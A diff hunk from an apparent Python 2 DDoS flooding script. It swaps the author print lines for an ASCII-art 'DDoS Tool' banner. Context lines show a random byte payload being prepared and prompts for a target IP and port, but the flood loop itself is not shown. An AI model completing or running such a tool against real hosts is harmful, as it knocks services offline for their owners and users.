@@ -19,10 +19,41 @@ bytes = random._urandom(5590)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print
-print "Author   : zhicco234" 
-print "github   : https://github.com/zhicco234"
-print
+print \
+"""
+                                ,-.
+                               ( O_)
+                              / `-/
+                             /-. /
+                            /   )
+                           /   /  
+              _           /-. /
+             (_)*-._     /   )
+               *-._ *-'**( )/    
+                   *-/*-._* `. 
+                    /     *-.'._
+                   /\       /-._*-._
+    _,---...__    /  ) _,-*/    *-(_)
+___<__(|) _   **-/  / /   /
+ '  `----' **-.   \/ /   /
+               )  ] /   /
+       ____..-'   //   /                       )
+   ,-**      __.,'/   /   ___                 /,
+  /    ,--**/  / /   /,-**   ***-.          ,'/
+ [    (    /  / /   /  ,.---,_   `._   _,-','
+  \    `-./  / /   /  /       `-._  *** ,-'
+   `-._  /  / /   /_,'            **--*
+       */  / /   /*         
+       /  / /   /
+      /  / /   /  
+     /  |,'   /  
+    :   /    /
+    [  /   ,'     ~> DDoS Tool<~
+    | /  ,'      ~~>Created By ZHICCO<~~
+    |/,-'
+    '
+                                                       
+""" 
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
